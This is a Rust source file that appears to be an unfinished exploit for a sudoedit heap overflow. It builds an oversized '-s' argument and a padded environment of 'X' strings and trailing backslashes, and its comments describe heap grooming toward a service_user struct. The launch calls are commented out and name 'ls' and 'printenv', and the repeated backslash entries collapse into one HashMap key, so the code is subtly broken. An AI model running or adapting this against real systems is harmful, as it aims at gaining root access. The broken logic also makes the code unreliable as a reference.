use std::{collections::HashMap, process::Stdio};
use std::process::Command;

fn main() {
    // let buf = 
    let mut buf= ['\x00'; 0xf0];

    for i in &mut buf[0..0xe0] { *i = 'Y' }

    let args = [
        "-s",
        buf.iter().collect::<String>().as_str(),
    ];

    // Use some LC_ vars for heap Feng-Shui.
    // This should allocate the target service_user struct in the path of the overflow.
    // char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    // memset(messages + strlen(messages), 'A', 0xb8);

    // char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    // memset(telephone + strlen(telephone), 'A', 0x28);

    // char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    // memset(measurement + strlen(measurement), 'A', 0x28);



    // This environment variable will be copied onto the heap after the overflowing chunk.
    // Use it to bridge the gap between the overflow and the target service_user struct.
    let mut overflow= ['\x00'; 0x500];
    for i in &mut overflow[0..0x4cf] { *i = 'X' }
    overflow[0x4cf + 1] = '\\';

    let overflow_string = overflow.iter().collect::<String>();

    let envs: HashMap<String, String> = [
        (overflow_string.as_str(), ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("XXXXXXX\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("\\", ""),
        ("x/x\\", ""),
        ("Z", ""),
        // messages,
        // telephone,
        // measurement,
    ]
    .iter()
    .map(|(k, v)| (k.to_string(), v.to_string()))
    .collect();

    // Command::new("ls")
    //     .env_clear()
    //     .envs(&envs)
    //     .spawn()
    //     .expect("running sudoedit");

        // Command::new("printenv")
        // .stdin(Stdio::null())
        // .stdout(Stdio::inherit())
        // .env_clear()
        // .envs(&envs)
        // .spawn()
        // .expect("running sudoedit");
}
